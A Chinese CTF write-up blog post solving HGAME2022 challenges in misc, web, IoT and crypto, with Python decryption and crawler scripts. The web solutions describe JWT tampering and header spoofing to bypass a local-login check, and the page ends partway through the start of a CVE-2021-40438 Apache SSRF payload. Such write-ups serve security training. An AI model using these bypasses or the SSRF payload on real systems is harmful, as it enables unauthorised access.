<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="HGAME2022 wp, Ethe&#39;s blog">
    <meta name="description" content="带*为赛后复现
第一周wpMISC欢迎欢迎！热烈欢迎！签到
这个压缩包有点麻烦压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag

好康的流量wireshar">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>HGAME2022 wp | Ethe&#39;s blog</title>
    <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/my.css">

    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/jquery/jquery-3.6.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Ethe&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Ethe&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/2.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">HGAME2022 wp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: scroll;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }
    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-01-21
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-06-19
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    5.9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    29 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>带*为赛后复现</p>
<h1 id="第一周wp"><a href="#第一周wp" class="headerlink" title="第一周wp"></a>第一周wp</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="欢迎欢迎！热烈欢迎！"><a href="#欢迎欢迎！热烈欢迎！" class="headerlink" title="欢迎欢迎！热烈欢迎！"></a>欢迎欢迎！热烈欢迎！</h3><p>签到</p>
<h3 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h3><p>压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171347731.png" alt="image-20220121171347731"></p>
<h3 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h3><p>wireshark打开，追踪tcp流得到一大串base64值，转成图片</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171627907.png" alt="image-20220121171627907"></p>
<p>stegslove看一下</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171645072.png" alt="image-20220121171645072"></p>
<p>找个在线扫条形码的网站扫一下得到前半部分，后半部分利用zsteg能直接看到</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171734983.png" alt="image-20220121171734983"></p>
<h3 id="群青-其实是幽灵东京）"><a href="#群青-其实是幽灵东京）" class="headerlink" title="群青(其实是幽灵东京）"></a>群青(其实是幽灵东京）</h3><p>第一个音频文件</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164910035.png" alt="image-20220123164910035"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164940731.png" alt="image-20220123164940731"></p>
<p>猜密码是yoasobi</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164849913.png" alt="image-20220123164849913"></p>
<p>得到一个网址，里面是sstv为文件名的音频文件，用robot36接收一下</p>
<p>得到一个二维码</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123171839098.png" alt="image-20220123171839098"></p>
<p>扫码拿到flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123171902080.png" alt="image-20220123171902080"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171811854.png" alt="image-20220121171811854"></p>
<p>题目描述暗示todo里藏着东西，看一下源码</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171913651.png" alt="image-20220121171913651"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171925729.png" alt="image-20220121171925729"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172104885.png" alt="image-20220121172104885"></p>
<p>猜到flag可能再id为1的内容里</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172217273.png" alt="image-20220121172217273"></p>
<p>访问的时候显示没添加cookie或者token</p>
<p>抓包给他加个jwt</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172251918.png" alt="image-20220121172251918"></p>
<p>jwt可以根据前边的网页抓包得到的jwt修改</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172330976.png" alt="image-20220121172330976"></p>
<h3 id="蛛蛛-嘿嘿♥我的蛛蛛"><a href="#蛛蛛-嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛...嘿嘿♥我的蛛蛛"></a>蛛蛛...嘿嘿♥我的蛛蛛</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172512414.png" alt="image-20220121172512414"></p>
<pre class="language-python" data-language="python"><code class="language-python">from time import sleep

import requests

url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;
key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot;
for i in range(1, 1000):
    url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;
    url &#x3D; url + key
    print(url)
    r &#x3D; requests.get(url&#x3D;url)
    # if &#39;href&#39; in r.text:
    print(r.text)
    lstNew &#x3D; r.text
    if &#39;href&#39; in lstNew:
        start &#x3D; lstNew.find(&quot;href&#x3D;\&quot;?&quot;)
        print(start)
        end &#x3D; lstNew.find(&quot;D\&quot;&gt;点我试试&quot;)
        print(end)
        length &#x3D; len(&quot;href&#x3D;\&quot;&quot;)
        l &#x3D; lstNew[start + length:end +1]
        key &#x3D; l
        print(key)
        if key &#x3D;&#x3D; &#39;&#39;:
            break
        sleep(0.5)
        if &quot;hgame&#123;&quot; in r.text:
            print(r.text)
            break
    else:
        print(r.text)
        break</code></pre>

<p>写的脚本（好拉的编程</p>
<p>跑到第100关后在响应头里找</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172754893.png" alt="image-20220121172754893"></p>
<h3 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h3><p>源码里直接找</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172901215.png" alt="image-20220121172901215"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172914978.png" alt="image-20220121172914978"></p>
<h3 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172941617.png" alt="image-20220121172941617"></p>
<p>先加个referer头为qiumingshan.net</p>
<p>然后改ua</p>
<p>再改cookie  flavor = Raspberry</p>
<p>然后再加上一个Gasoline:100</p>
<p>再是要求本地登录，但是过滤了xff，换个头就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-1327848764.png" alt="image-20220121172941618"></p>
<h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><h3 id="饭卡的uno"><a href="#饭卡的uno" class="headerlink" title="饭卡的uno"></a>饭卡的uno</h3><p>不会iot，但是这个把附件拖了ida里就能看见flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121173504075.png" alt="image-20220121173504075"></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h3><p>已知p，q，e和密文求明文的rsa</p>
<pre class="language-python" data-language="python"><code class="language-python">import libnum
from Crypto.Util.number import long_to_bytes
string &#x3D; &#39;&#39;
flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]
for x in range(38):
    c &#x3D; flag[x][3]
    q &#x3D; flag[x][2]
    p &#x3D; flag[x][1]
    n &#x3D; p*q
    e &#x3D; flag[x][0]
    d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))
    m &#x3D; pow(c, d, n)  
    string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)
print(string)</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121213332698.png" alt="image-20220121213332698"></p>
<h3 id="English-Novel"><a href="#English-Novel" class="headerlink" title="English Novel"></a>English Novel</h3><p>给了四个文件，一个小说原文，一个加密后的小说，一个加密脚本，一个flag密文</p>
<p>先根据小说原文里的标点通过Linux的grep命令看一下相对的密文</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003056261.png" alt="image-20220122003056261"></p>
<p>再根据加密脚本逆向写出求key的脚本，然后是求密文（真的好拉的编程</p>
<pre class="language-python" data-language="python"><code class="language-python">def encrypt(data, key):
    #   assert len(data) &lt;&#x3D; len(key)
    result &#x3D; &quot;&quot;
    for i in range(len(data)):
        if data[i].isupper():
            result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))
        elif data[i].islower():
            result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))
        else:
            result +&#x3D; data[i]
    return result


def decrypt(result, key):
    #   assert len(data) &lt;&#x3D; len(key)
    data &#x3D; &quot;&quot;
    for i in range(len(result)):
        if result[i].isupper():
            #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))
            for k in range(65,90):#python这个对负数求余真不知道怎么逆了，只能爆破了
                result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))
                if result1 &#x3D;&#x3D; result[i]:
                    data +&#x3D; chr(k)
        elif result[i].islower():
            for k in range(96,123):
                result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))
                if result1 &#x3D;&#x3D; result[i]:
                    data +&#x3D; chr(k)
        else:
            data +&#x3D; result[i]
    print(data)


def decryptkey(data1, result1):
    keyboard &#x3D; []
    for n in range(25):
        for i in range(len(data1)):
            if data[i].isupper():
                # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))
                key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i]))
                keyboard.append(key)
            elif data[i].islower():
                key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i]))
                keyboard.append(key)
            else:
                key &#x3D; 0
                keyboard.append(key)
        n &#x3D; str(n)
        for i in keyboard:
            print(i, end&#x3D;&#39;,&#39;)
        print(&#39;&#x2F;n&#39;)


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#这里写原文
    result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#这里写密文
    a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3]
    #decryptkey(data, result)
    decrypt(result, a)
    #print(encrypt(data, a))
</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003437238.png" alt="image-20220122003437238"></p>
<p>这个flag在单引号里边的部分还是有点问题，可能是因为key的关系，但是由attfck能猜出attack，由pla1qtext能猜出plaintext，然后改完之后搜一下<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003614141.png" alt="image-20220122003614141"></p>
<p>最终flag</p>
<p>hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?}</p>
<h1 id="第二周wp"><a href="#第二周wp" class="headerlink" title="第二周wp"></a>第二周wp</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache!*"></a>Apache!*</h3><p>有备份文件</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220205114347850.png" alt="image-20220205114347850"></p>
<p>根据题目描述应该是ssrf漏洞，结合apache版本能搜到CVE-2021-40438</p>
<pre class="language-none"><code class="language-none">?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA